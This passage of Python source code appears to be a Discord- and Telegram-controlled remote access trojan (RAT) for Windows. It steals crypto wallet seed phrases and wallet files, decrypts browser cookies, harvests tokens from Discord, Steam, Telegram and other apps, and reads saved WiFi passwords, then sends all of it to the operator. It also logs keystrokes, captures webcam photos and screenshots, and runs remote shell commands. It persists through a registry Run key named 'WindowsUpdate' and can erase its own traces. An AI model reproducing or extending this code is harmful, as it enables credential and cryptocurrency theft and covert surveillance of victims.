                            found_phrases.append((' '.join(words_in_line[:12]), 12))
                        if len(words_in_line) >= 24 and all(w in BIP39_SET for w in words_in_line[:24]):
                            found_phrases.append((' '.join(words_in_line[:24]), 24))
    
    return list(set(found_phrases))

def scan_for_seed_phrases():
    """Scan common locations for seed phrases"""
    results = []
    locations = [
        os.path.expanduser("~") + "\\Desktop",
        os.path.expanduser("~") + "\\Documents",
        os.path.expanduser("~") + "\\Downloads",
        os.path.expanduser("~") + "\\AppData\\Roaming\\Exodus",
        os.path.expanduser("~") + "\\AppData\\Roaming\\Atomic",
        os.path.expanduser("~") + "\\AppData\\Roaming\\Electrum",
        os.path.expanduser("~") + "\\AppData\\Roaming\\Coinomi",
        os.path.expanduser("~") + "\\AppData\\Roaming\\Trust Wallet",
        os.path.expanduser("~") + "\\AppData\\Roaming\\Wasabi",
        os.path.expanduser("~") + "\\AppData\\Roaming\\Ledger Live",
        os.path.expanduser("~") + "\\AppData\\Roaming\\Trezor",
        os.path.expanduser("~") + "\\AppData\\Local\\Guarda",
        os.path.expanduser("~") + "\\AppData\\Roaming\\Binance",
        os.path.expanduser("~") + "\\AppData\\Local\\Jaxx",
        os.path.expanduser("~") + "\\AppData\\Local\\Coinbase"
    ]
    
    for location in locations:
        if not os.path.exists(location):
            continue
        try:
            for root, dirs, files in os.walk(location):
                for file in files:
                    if file.endswith(('.txt', '.json', '.dat', '.log', '.bak', '.wallet', '.seed', '.mnemonic')):
                        try:
                            path = os.path.join(root, file)
                            if os.path.getsize(path) > 1000000:
                                continue
                            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                            phrases = find_seed_phrases(content)
                            for phrase, word_count in phrases:
                                results.append({
                                    'file': path,
                                    'phrase': phrase,
                                    'words': word_count
                                })
                        except:
                            pass
        except:
            pass
    
    return results

# ============================================================
# BROWSER COOKIE EXTRACTION
# ============================================================

def get_chrome_cookies(browser_path):
    """Extract cookies from Chrome-based browser"""
    cookies = []
    try:
        local_state_path = os.path.join(browser_path, "Local State")
        if not os.path.exists(local_state_path):
            return cookies
        
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
        
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]
        secret_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        
        profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]
        for profile in profiles:
            cookies_path = os.path.join(browser_path, profile, "Network", "Cookies")
            if not os.path.exists(cookies_path):
                continue
            
            temp_path = os.path.join(os.environ['TEMP'], f"cookies_{int(time.time())}.db")
            shutil.copy2(cookies_path, temp_path)
            
            try:
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                for host, name_val, encrypted_value in cursor.fetchall():
                    try:
                        if encrypted_value is None or len(encrypted_value) < 3:
                            continue
                        
                        if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
                            encrypted_value = encrypted_value[3:]
                        
                        nonce = encrypted_value[:12]
                        ciphertext = encrypted_value[12:-16]
                        tag = encrypted_value[-16:]
                        
                        cipher = AES.new(secret_key, AES.MODE_GCM, nonce=nonce)
                        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                        
                        cookies.append({
                            "browser": os.path.basename(browser_path),
                            "host": host,
                            "name": name_val,
                            "value": decrypted.decode('utf-8')
                        })
                    except:
                        pass
                conn.close()
            except:
                pass
            
            try:
                os.remove(temp_path)
            except:
                pass
    except:
        pass
    
    return cookies

def get_all_browser_cookies():
    """Extract cookies from ALL installed browsers"""
    all_cookies = []
    detected = []
    
    browsers = {
        "Chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data",
        "Edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data",
        "Brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data",
        "Opera": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable",
        "Vivaldi": os.path.expanduser("~") + r"\AppData\Local\Vivaldi\User Data",
        "OperaGX": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera GX Stable",
        "Chromium": os.path.expanduser("~") + r"\AppData\Local\Chromium\User Data",
        "Firefox": os.path.expanduser("~") + r"\AppData\Roaming\Mozilla\Firefox\Profiles",
        "Waterfox": os.path.expanduser("~") + r"\AppData\Roaming\Waterfox\Profiles"
    }
    
    for name, path in browsers.items():
        if os.path.exists(path):
            detected.append(name)
            if name in ["Firefox", "Waterfox"]:
                try:
                    for profile in os.listdir(path):
                        if profile.endswith(".default") or profile.endswith(".default-release"):
                            cookies_path = os.path.join(path, profile, "cookies.sqlite")
                            if os.path.exists(cookies_path):
                                try:
                                    conn = sqlite3.connect(cookies_path)
                                    cursor = conn.cursor()
                                    cursor.execute("SELECT host, name, value FROM moz_cookies")
                                    for host, name_val, value in cursor.fetchall():
                                        if value:
                                            all_cookies.append({
                                                "browser": name,
                                                "host": host,
                                                "name": name_val,
                                                "value": value
                                            })
                                    conn.close()
                                except:
                                    pass
                except:
                    pass
            else:
                if CRYPTO_AVAILABLE:
                    try:
                        cookies = get_chrome_cookies(path)
                        all_cookies.extend(cookies)
                    except:
                        pass
    
    return all_cookies, list(set(detected))

# ============================================================
# SCAN ALL APPS (COMPLETE VERSION)
# ============================================================

def scan_all_apps():
    """Scan for ALL installed apps and grab their tokens/cookies + seed phrases"""
    results = []
    detected_apps = []
    
    # Discord
    discord_paths = [
        os.path.expanduser("~") + r"\AppData\Roaming\Discord\Local Storage\leveldb",
        os.path.expanduser("~") + r"\AppData\Roaming\DiscordPTB\Local Storage\leveldb",
        os.path.expanduser("~") + r"\AppData\Roaming\DiscordCanary\Local Storage\leveldb",
        os.path.expanduser("~") + r"\AppData\Roaming\Lightcord\Local Storage\leveldb",
    ]
    for path in discord_paths:
        if os.path.exists(path):
            detected_apps.append("Discord")
            try:
                for file in os.listdir(path):
                    if file.endswith((".log", ".ldb")):
                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
                            data = f.read()
                            matches = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', data)
                            for m in matches:
                                results.append(f"🟣 Discord Token: {m}")
                            matches = re.findall(r'mfa\.[\w-]{84}', data)
                            for m in matches:
                                results.append(f"🟣 Discord MFA: {m}")
            except:
                pass
    
    # Steam
    steam_path = os.path.expanduser("~") + r"\AppData\Local\Steam\config\loginusers.vdf"
    if os.path.exists(steam_path):
        detected_apps.append("Steam")
        try:
            with open(steam_path, 'r', errors='ignore') as f:
                data = f.read()
                matches = re.findall(r'"AccountName"\s*"([^"]+)"', data)
                for m in matches:
                    results.append(f"🎮 Steam Account: {m}")
                matches = re.findall(r'"SteamID"\s*"([^"]+)"', data)
                for m in matches:
                    results.append(f"🎮 Steam ID: {m}")
        except:
            pass
    
    # Spotify
    spotify_path = os.path.expanduser("~") + r"\AppData\Roaming\Spotify\Users"
    if os.path.exists(spotify_path):
        detected_apps.append("Spotify")
        try:
            for file in os.listdir(spotify_path):
                if file.endswith(".json"):
                    with open(os.path.join(spotify_path, file), 'r', errors='ignore') as f:
                        data = f.read()
                        matches = re.findall(r'"accessToken":"([^"]+)"', data)
                        for m in matches:
                            results.append(f"🎵 Spotify Token: {m[:50]}...")
        except:
            pass
    
    # Battle.net
    battlenet_paths = [
        os.path.expanduser("~") + r"\AppData\Local\Battle.net\Blizzard\Local Storage\leveldb",
        os.path.expanduser("~") + r"\AppData\Local\Blizzard\Local Storage\leveldb",
    ]
    for path in battlenet_paths:
        if os.path.exists(path):
            detected_apps.append("Battle.net")
            try:
                for file in os.listdir(path):
                    if file.endswith((".log", ".ldb")):
                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
                            data = f.read()
                            matches = re.findall(r'"access_token":"([^"]+)"', data)
                            for m in matches:
                                results.append(f"🎮 Battle.net Token: {m[:50]}...")
            except:
                pass
    
    # Riot Games
    riot_path = os.path.expanduser("~") + r"\AppData\Local\Riot Games\Riot Client\Data"
    if os.path.exists(riot_path):
        detected_apps.append("Riot Games")
        try:
            for root, dirs, files in os.walk(riot_path):
                for file in files:
                    if file.endswith(".json"):
                        with open(os.path.join(root, file), 'r', errors='ignore') as f:
                            data = f.read()
                            matches = re.findall(r'"access_token":"([^"]+)"', data)
                            for m in matches:
                                results.append(f"🏹 Riot Token: {m[:50]}...")
        except:
            pass
    
    # Epic Games
    epic_path = os.path.expanduser("~") + r"\AppData\Local\Epic Games\Launcher\Saved\Config\Windows\GameUserSettings.ini"
    if os.path.exists(epic_path):
        detected_apps.append("Epic Games")
        try:
            with open(epic_path, 'r', errors='ignore') as f:
                data = f.read()
                matches = re.findall(r'[a-f0-9]{32}', data)
                for m in matches:
                    results.append(f"🎯 Epic Games ID: {m}")
        except:
            pass
    
    # Minecraft
    mc_paths = [
        os.path.expanduser("~") + r"\AppData\Roaming\.minecraft\launcher_profiles.json",
        os.path.expanduser("~") + r"\AppData\Roaming\.minecraft\usercache.json",
    ]
    for path in mc_paths:
        if os.path.exists(path):
            detected_apps.append("Minecraft")
            try:
                with open(path, 'r', errors='ignore') as f:
                    data = f.read()
                    matches = re.findall(r'"accessToken":"([^"]+)"', data)
                    for m in matches:
                        results.append(f"⛏️ Minecraft Token: {m[:50]}...")
                    matches = re.findall(r'"uuid":"([^"]+)"', data)
                    for m in matches:
                        results.append(f"⛏️ Minecraft UUID: {m}")
            except:
                pass
    
    # Roblox
    roblox_paths = [
        os.path.expanduser("~") + r"\AppData\Local\Roblox\Local Storage\leveldb",
        os.path.expanduser("~") + r"\AppData\Roaming\Roblox\Local Storage\leveldb",
    ]
    for path in roblox_paths:
        if os.path.exists(path):
            detected_apps.append("Roblox")
            try:
                for file in os.listdir(path):
                    if file.endswith((".log", ".ldb")):
                        with open(os.path.join(path, file), 'r', errors='ignore') as f:
                            data = f.read()
                            matches = re.findall(r'"_|ROBLOSECURITY":"([^"]+)"', data)
                            for m in matches:
                                results.append(f"🧱 Roblox Token: {m[:50]}...")
            except:
                pass
    
    # Reddit
    reddit_path = os.path.expanduser("~") + r"\AppData\Roaming\Reddit\Local Storage\leveldb"
    if os.path.exists(reddit_path):
        detected_apps.append("Reddit")
        try:
            for file in os.listdir(reddit_path):
                if file.endswith((".log", ".ldb")):
                    with open(os.path.join(reddit_path, file), 'r', errors='ignore') as f:
                        data = f.read()
                        matches = re.findall(r'"access_token":"([^"]+)"', data)
                        for m in matches:
                            results.append(f"🔴 Reddit Token: {m[:50]}...")
        except:
            pass
    
    # TikTok
    tiktok_path = os.path.expanduser("~") + r"\AppData\Roaming\TikTok\Local Storage\leveldb"
    if os.path.exists(tiktok_path):
        detected_apps.append("TikTok")
        try:
            for file in os.listdir(tiktok_path):
                if file.endswith((".log", ".ldb")):
                    with open(os.path.join(tiktok_path, file), 'r', errors='ignore') as f:
                        data = f.read()
                        matches = re.findall(r'"sessionid":"([^"]+)"', data)
                        for m in matches:
                            results.append(f"🎵 TikTok Session: {m[:50]}...")
        except:
            pass
    
    # Telegram
    telegram_paths = [
        os.path.expanduser("~") + r"\AppData\Roaming\Telegram Desktop\tdata",
        os.path.expanduser("~") + r"\AppData\Roaming\Telegram Desktop\tdummy",
    ]
    for path in telegram_paths:
        if os.path.exists(path):
            detected_apps.append("Telegram")
            try:
                for file in os.listdir(path):
                    if file.endswith(".s"):
                        with open(os.path.join(path, file), 'rb') as f:
                            data = f.read()
                            matches = re.findall(rb'\d+:[a-zA-Z0-9_-]{35}', data)
                            for m in matches:
                                results.append(f"🔵 Telegram Session: {m.decode('utf-8', errors='ignore')}")
            except:
                pass
    
    # WhatsApp
    wa_path = os.path.expanduser("~") + r"\AppData\Roaming\WhatsApp\Local Storage\leveldb"
    if os.path.exists(wa_path):
        detected_apps.append("WhatsApp")
        try:
            for file in os.listdir(wa_path):
                if file.endswith((".log", ".ldb")):
                    with open(os.path.join(wa_path, file), 'r', errors='ignore') as f:
                        data = f.read()
                        matches = re.findall(r'"token":"([^"]+)"', data)
                        for m in matches:
                            results.append(f"💬 WhatsApp Token: {m[:50]}...")
        except:
            pass
    
    # BROWSER COOKIES
    if CRYPTO_AVAILABLE:
        cookies, browser_detected = get_all_browser_cookies()
        for app in browser_detected:
            if app not in detected_apps:
                detected_apps.append(app)
        for c in cookies[:100]:
            results.append(f"🍪 Browser: {c['browser']} | {c['host']} | {c['name']} = {c['value'][:50]}...")
    
    # WALLET SEED PHRASES
    seed_results = scan_for_seed_phrases()
    for sr in seed_results:
        results.append(f"🔑 SEED PHRASE ({sr['words']} words): {sr['phrase']}\n   File: {sr['file']}")
        if "Seed Phrase" not in detected_apps:
            detected_apps.append("Seed Phrase")
    
    # WALLET FILES
    wallet_paths = [
        (os.path.expanduser("~") + r"\AppData\Roaming\Exodus", "Exodus Wallet"),
        (os.path.expanduser("~") + r"\AppData\Roaming\Atomic", "Atomic Wallet"),
        (os.path.expanduser("~") + r"\AppData\Roaming\Electrum", "Electrum Wallet"),
        (os.path.expanduser("~") + r"\AppData\Roaming\Coinomi", "Coinomi Wallet"),
        (os.path.expanduser("~") + r"\AppData\Roaming\Trust Wallet", "Trust Wallet"),
        (os.path.expanduser("~") + r"\AppData\Roaming\Wasabi", "Wasabi Wallet"),
        (os.path.expanduser("~") + r"\AppData\Roaming\Ledger Live", "Ledger Live"),
        (os.path.expanduser("~") + r"\AppData\Local\Guarda", "Guarda Wallet"),
        (os.path.expanduser("~") + r"\AppData\Roaming\Binance", "Binance Wallet"),
        (os.path.expanduser("~") + r"\AppData\Local\Jaxx", "Jaxx Wallet"),
        (os.path.expanduser("~") + r"\AppData\Local\Coinbase", "Coinbase Wallet"),
    ]
    for path, name in wallet_paths:
        if os.path.exists(path):
            if name not in detected_apps:
                detected_apps.append(name)
            try:
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.endswith(('.json', '.dat', '.wallet', '.key')):
                            file_path = os.path.join(root, file)
                            if os.path.getsize(file_path) < 500000:
                                with open(file_path, 'r', errors='ignore') as f:
                                    data = f.read()
                                    results.append(f"💰 {name} File: {file_path}\n   Data: {data[:200]}...")
            except:
                pass
    
    return results, list(set(detected_apps))

# ============================================================
# BOT COMMANDS
# ============================================================

def is_authorized():
    async def auth(ctx):
        if ctx.author.id in Config.WHITELISTED:
            return True
        embed = discord.Embed(title="Access Denied", color=discord.Color.red())
        await ctx.send(embed=embed)
        return False
    return commands.check(auth)

async def send_embed(ctx, title, description, color=discord.Color.blue()):
    embed = discord.Embed(title=title, description=description, color=color)
    await ctx.send(embed=embed)

@bot.event
async def on_ready():
    await bot.get_channel(Config.MAIN_CHANNEL).send(f"<@{Config.WHITELISTED[0]}>")
    embed = discord.Embed(title="RAT Online", description=f"Prefix: `{Config.PREFIX}`\nUser: `{get_displayname()}`\nAdmin: {is_admin()}", color=discord.Color.green())
    await bot.get_channel(Config.MAIN_CHANNEL).send(embed=embed)

# ============================================================
# FULL SYSTEM INFO COMMAND
# ============================================================

@bot.command(name='info')
@is_authorized()
async def system_info(ctx):
    try:
        await send_embed(ctx, "Collecting Info", "Please wait...", discord.Color.blue())
        display_name = get_displayname()
        hwid = get_hwid()
        cpu_info = get_cpuinfo()
        gpu_info = get_gpuinfo()
        ram_info = get_raminfo()
        disks = get_disks()
        ip_info = get_ipinfo()
        mac_address = get_macaddress()
        wifi_profiles = get_wifipasswords()
        
        embed = discord.Embed(title="System Information", color=discord.Color.blue())
        embed.add_field(name="Display Name", value=f"```{display_name}```", inline=False)
        embed.add_field(name="HWID", value=f"```{hwid}```", inline=False)
        embed.add_field(name="CPU", value=f"```{cpu_info}```", inline=False)
        embed.add_field(name="GPU", value=f"```{gpu_info}```", inline=False)
        memory = psutil.virtual_memory()
        embed.add_field(name="RAM", value=f"```{ram_info} ({memory.percent}% used)```", inline=False)
        embed.add_field(name="CPU Usage", value=f"```{psutil.cpu_percent(interval=1)}%```", inline=True)
        disk_str = "\n".join([f"{d['drive']}: {d['free']}GB free / {d['total']}GB" for d in disks[:3]])
        embed.add_field(name="Disks", value=f"```{disk_str}```", inline=False)
        embed.add_field(name="Public IP", value=f"```{ip_info['ip']}```", inline=False)
        embed.add_field(name="Location", value=f"```{ip_info['city']}, {ip_info['region']}, {ip_info['country']}```", inline=False)
        embed.add_field(name="MAC", value=f"```{mac_address}```", inline=False)
        embed.add_field(name="Local IP", value=f"```{get_local_ip()}```", inline=True)
        embed.add_field(name="OS", value=f"```{platform.system()} {platform.release()}```", inline=True)
        boot_time = datetime.fromtimestamp(psutil.boot_time())
        embed.add_field(name="Boot Time", value=f"```{boot_time.strftime('%Y-%m-%d %H:%M:%S')}```", inline=True)
        
        if wifi_profiles:
            wifi_str = "\n".join([f"{w['name']}: {w['password']}" for w in wifi_profiles[:5]])
            embed.add_field(name="WiFi Passwords", value=f"```{wifi_str}```", inline=False)
        
        await ctx.send(embed=embed)
        
        # Send via Telegram if configured
        if Config.DELIVERY_METHOD in ["telegram", "both", "telegram_backup"]:
            content = f"System Info:\nDisplay Name: {display_name}\nHWID: {hwid}\nCPU: {cpu_info}\nRAM: {ram_info}\nIP: {ip_info['ip']}\nLocation: {ip_info['city']}, {ip_info['country']}"
            send_to_telegram(f"<b>📊 System Info</b>\n\n{content}")
            
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

# ============================================================
# ULTIMATE GRAB COMMAND
# ============================================================

@bot.command(name='grab')
@is_authorized()
async def grab_all(ctx):
    """ULTIMATE GRAB - Browser Cookies + App Tokens + Seed Phrases + Wallet Files"""
    await send_embed(ctx, "🔍 ULTIMATE GRAB INITIATED", 
        "Scanning for:\n• ALL Browsers (Chrome, Edge, Brave, Firefox, Opera, Vivaldi)\n• ALL Apps (Discord, Steam, Spotify, Battle.net, Riot, Epic, Minecraft, Roblox, Reddit, TikTok, Telegram, WhatsApp)\n• 🆕 Crypto Wallet Seed Phrases (12/24 word BIP39)\n• 🆕 Wallet Files (Exodus, Atomic, Electrum, Coinomi, Trust, Wasabi, Ledger, Trezor, Guarda, Binance, Jaxx, Coinbase)",
        discord.Color.blue())
    
    results, detected = scan_all_apps()
    
    if detected:
        detected_str = "✅ Detected: " + ", ".join(detected)
    else:
        detected_str = "❌ No token-bearing apps detected"
    
    if results:
        output = "\n".join(results[:80])
        if len(output) > 1900:
            with open("grab_all.txt", "w", encoding='utf-8') as f:
                f.write("\n".join(results))
            await ctx.send(file=discord.File("grab_all.txt"))
            os.remove("grab_all.txt")
            embed = discord.Embed(title="📦 All Data Grabbed", color=discord.Color.green())
            embed.add_field(name="📊 Detected Apps", value=detected_str, inline=False)
            embed.add_field(name="📈 Total Items", value=str(len(results)), inline=True)
            embed.add_field(name="💾 File", value="Downloaded above", inline=True)
            await ctx.send(embed=embed)
            
            # Send via Telegram if configured
            if Config.DELIVERY_METHOD in ["telegram", "both", "telegram_backup"]:
                with open("grab_all.txt", "r", encoding='utf-8') as f:
                    content = f.read()
                send_to_telegram(f"<b>📦 All Data Grabbed</b>\n\nDetected: {detected_str}\nTotal Items: {len(results)}\n\n{content[:1000]}...")
        else:
            embed = discord.Embed(title="📦 All Data Grabbed", description=f"```{output}```", color=discord.Color.green())
            embed.add_field(name="📊 Detected Apps", value=detected_str, inline=False)
            embed.add_field(name="📈 Total Items", value=str(len(results)), inline=True)
            await ctx.send(embed=embed)
            
            if Config.DELIVERY_METHOD in ["telegram", "both", "telegram_backup"]:
                send_to_telegram(f"<b>📦 All Data Grabbed</b>\n\nDetected: {detected_str}\nTotal Items: {len(results)}\n\n{output[:1000]}")
    else:
        embed = discord.Embed(title="📦 No Data Found", color=discord.Color.red())
        embed.add_field(name="💡 Tip", value="Make sure the target has apps like Discord, Steam, Chrome, etc. installed and logged in", inline=False)
        await ctx.send(embed=embed)

# ============================================================
# TELEGRAM GRAB COMMAND (For Telegram-only mode)
# ============================================================

# This function allows grabbing via Telegram if delivery method is Telegram
# It's called directly from Telegram bot

def telegram_grab():
    """Grab all data and send via Telegram"""
    results, detected = scan_all_apps()
    
    if detected:
        detected_str = "✅ Detected: " + ", ".join(detected)
    else:
        detected_str = "❌ No token-bearing apps detected"
    
    if results:
        output = "\n".join(results[:80])
        content = f"<b>📦 All Data Grabbed</b>\n\nDetected: {detected_str}\nTotal Items: {len(results)}\n\n{output[:1000]}"
        send_to_telegram(content)
        
        if len(results) > 80:
            with open("grab_all.txt", "w", encoding='utf-8') as f:
                f.write("\n".join(results))
            send_to_telegram("📁 Full results:", "grab_all.txt")
            os.remove("grab_all.txt")
    else:
        send_to_telegram("<b>📦 No Data Found</b>\n\nMake sure target has apps logged in")

# ============================================================
# ADDITIONAL COMMANDS (Quick Add)
# ============================================================

@bot.command(name='screenshot')
@is_authorized()
async def take_screenshot(ctx, name: Optional[str] = None):
    try:
        filename = name or f"screenshot_{int(time.time())}.png"
        pyautogui.screenshot().save(filename)
        with open(filename, 'rb') as f:
            await ctx.send(file=discord.File(f))
        os.remove(filename)
        await send_embed(ctx, "Screenshot", "Captured", discord.Color.green())
        
        if Config.DELIVERY_METHOD in ["telegram", "both", "telegram_backup"]:
            with open(filename, 'rb') as f:
                send_to_telegram("📸 Screenshot", filename)
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='webcampic')
@is_authorized()
async def webcam_pic(ctx):
    await send_embed(ctx, "Capturing", "Webcam...", discord.Color.blue())
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            await send_embed(ctx, "Webcam", "No camera found", discord.Color.red())
            return
        ret, frame = cap.read()
        if ret:
            path = os.environ['TEMP'] + "\\webcam.jpg"
            cv2.imwrite(path, frame)
            cap.release()
            with open(path, 'rb') as f:
                await ctx.send(file=discord.File(f))
            os.remove(path)
            await send_embed(ctx, "Webcam", "Photo captured", discord.Color.green())
            
            if Config.DELIVERY_METHOD in ["telegram", "both", "telegram_backup"]:
                with open(path, 'rb') as f:
                    send_to_telegram("📷 Webcam Photo", path)
        else:
            await send_embed(ctx, "Webcam", "Failed to capture", discord.Color.red())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='keylogstart')
@is_authorized()
async def keylog_start(ctx):
    global keylog_active
    if keylog_active:
        await send_embed(ctx, "Keylog", "Already running", discord.Color.orange())
        return
    thread = threading.Thread(target=start_keylog, daemon=True)
    thread.start()
    keylog_active = True
    await send_embed(ctx, "Keylog", "Started", discord.Color.green())

def start_keylog():
    global keylog_active
    from pynput import keyboard
    def on_press(key):
        if not keylog_active:
            return False
        with open(keylog_file, 'a', encoding='utf-8') as f:
            try:
                if hasattr(key, 'char') and key.char:
                    f.write(key.char)
                elif key == key.space:
                    f.write(' ')
                elif key == key.enter:
                    f.write('\n')
                else:
                    f.write(f'[{str(key).replace("Key.", "").upper()}]')
            except:
                pass
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()

@bot.command(name='keylogstop')
@is_authorized()
async def keylog_stop(ctx):
    global keylog_active
    keylog_active = False
    await send_embed(ctx, "Keylog", "Stopped", discord.Color.orange())

@bot.command(name='keylogdump')
@is_authorized()
async def keylog_dump(ctx):
    if os.path.exists(keylog_file):
        with open(keylog_file, 'r', encoding='utf-8') as f:
            data = f.read()
        if len(data) > 1900:
            await ctx.send(file=discord.File(keylog_file))
        else:
            await send_embed(ctx, "⌨️ Keylog Dump", f"```{data}```", discord.Color.blue())
        
        if Config.DELIVERY_METHOD in ["telegram", "both", "telegram_backup"]:
            send_to_telegram("⌨️ Keylog Dump", keylog_file)
    else:
        await send_embed(ctx, "⌨️ Keylog", "No logs found", discord.Color.red())

@bot.command(name='shutdown')
@is_authorized()
async def shutdown_pc(ctx, delay: int = 30):
    try:
        if delay < 10:
            await send_embed(ctx, "Error", "Delay must be >=10", discord.Color.red())
            return
        await send_embed(ctx, "Shutdown", f"In {delay} seconds", discord.Color.red())
        await asyncio.sleep(delay)
        os.system('shutdown /s /f /t 0')
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='restart')
@is_authorized()
async def restart_pc(ctx, delay: int = 30):
    try:
        if delay < 10:
            await send_embed(ctx, "Error", "Delay must be >=10", discord.Color.red())
            return
        await send_embed(ctx, "Restart", f"In {delay} seconds", discord.Color.orange())
        await asyncio.sleep(delay)
        os.system('shutdown /r /f /t 0')
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='lock')
@is_authorized()
async def lock_pc(ctx):
    try:
        ctypes.windll.user32.LockWorkStation()
        await send_embed(ctx, "Locked", "Workstation locked", discord.Color.orange())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='persistence')
@is_authorized()
async def persistence(ctx):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(key)
        await send_embed(ctx, "Persistence", "Added to startup", discord.Color.green())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='killswitch')
@is_authorized()
async def killswitch(ctx):
    global keylog_active
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "WindowsUpdate")
        winreg.CloseKey(key)
    except:
        pass
    keylog_active = False
    if os.path.exists(keylog_file):
        os.remove(keylog_file)
    await send_embed(ctx, "Killswitch", "Traces cleaned, exiting", discord.Color.red())
    sys.exit(0)

@bot.command(name='cmd')
@is_authorized()
async def run_cmd(ctx, *, command: str):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout or result.stderr
        if len(output) > 1900:
            output = output[:1900] + "..."
        embed = discord.Embed(title="Command Output", description=f"```\n{output}\n```", color=discord.Color.dark_grey())
        await ctx.send(embed=embed)
        
        if Config.DELIVERY_METHOD in ["telegram", "both", "telegram_backup"]:
            send_to_telegram(f"<b>💻 Command: {command}</b>\n\n{output[:1000]}")
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='download')
@is_authorized()
async def download_file(ctx, *, filepath: str):
    try:
        if not os.path.isabs(filepath):
            filepath = os.path.join(current_path, filepath)
        filepath = os.path.normpath(filepath)
        if os.path.exists(filepath) and os.path.isfile(filepath):
            if os.path.getsize(filepath) > 104857600:
                await send_embed(ctx, "Error", "File >100MB (Discord limit)", discord.Color.red())
                return
            await ctx.send(file=discord.File(filepath))
            
            if Config.DELIVERY_METHOD in ["telegram", "both", "telegram_backup"]:
                send_to_telegram(f"📁 Downloaded: {filepath}", filepath)
        else:
            await send_embed(ctx, "Error", f"File not found: {filepath}", discord.Color.red())
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

@bot.command(name='listfiles')
@is_authorized()
async def list_files(ctx, directory: str = "."):
    try:
        if directory.startswith("~"):
            directory = os.path.expanduser(directory)
        if directory == ".":
            directory = current_path
        if not os.path.exists(directory):
            await send_embed(ctx, "Error", f"Directory not found: {directory}", discord.Color.red())
            return
        if not os.path.isdir(directory):
            await send_embed(ctx, "Error", f"Not a directory: {directory}", discord.Color.red())
            return
        
        files = os.listdir(directory)
        items = []
        for f in files:
            path = os.path.join(directory, f)
            if os.path.isdir(path):
                items.append({'name': f, 'type': 'folder'})
            else:
                size = os.path.getsize(path)
                items.append({'name': f, 'type': 'file', 'size': size})
        
        items.sort(key=lambda x: (0 if x['type'] == 'folder' else 1, x['name'].lower()))
        
        chunks = []
        current_chunk = []
        for item in items:
            if item['type'] == 'folder':
                line = f"📁 {item['name']}/"
            else:
                size = item['size']
                if size < 1024:
                    size_str = f"{size} B"
                elif size < 1048576:
                    size_str = f"{size/1024:.1f} KB"
                elif size < 1073741824:
                    size_str = f"{size/1048576:.1f} MB"
                else:
                    size_str = f"{size/1073741824:.2f} GB"
                emoji = get_file_emoji(item['name'])
                line = f"{emoji} {item['name']} ({size_str})"
            
            current_chunk.append(line)
            if len('\n'.join(current_chunk)) > 1800:
                chunks.append('\n'.join(current_chunk[:-1]))
                current_chunk = [line]
        if current_chunk:
            chunks.append('\n'.join(current_chunk))
        
        if not chunks:
            await send_embed(ctx, f"📁 {directory}", "Directory is empty", discord.Color.blue())
            return
        
        total_files = len([i for i in items if i['type'] == 'file'])
        total_folders = len([i for i in items if i['type'] == 'folder'])
        
        embed = discord.Embed(
            title=f"📁 {directory}",
            description=f"**{total_folders} folders, {total_files} files**\n\n{chunks[0]}",
            color=discord.Color.blue()
        )
        if len(chunks) > 1:
            embed.set_footer(text=f"Showing 1/{len(chunks)} | Use !listfiles {directory}")
        await ctx.send(embed=embed)
        
        for i, chunk in enumerate(chunks[1:], start=2):
            embed = discord.Embed(
                title=f"📁 {directory} (continued)",
                description=chunk,
                color=discord.Color.blue()
            )
            embed.set_footer(text=f"Showing {i}/{len(chunks)}")
            await ctx.send(embed=embed)
            
    except Exception as e:
        await send_embed(ctx, "Error", str(e), discord.Color.red())

def get_file_emoji(filename):
    ext = os.path.splitext(filename)[1].lower()
    emoji_map = {
        '.txt': '📄', '.py': '🐍', '.pyw': '🐍', '.exe': '⚙️', '.dll': '🔧',
        '.jpg': '🖼️', '.jpeg': '🖼️', '.png': '🖼️', '.gif': '🖼️', '.bmp': '🖼️',
        '.mp3': '🎵', '.wav': '🎵', '.mp4': '🎬', '.avi': '🎬', '.mkv': '🎬',
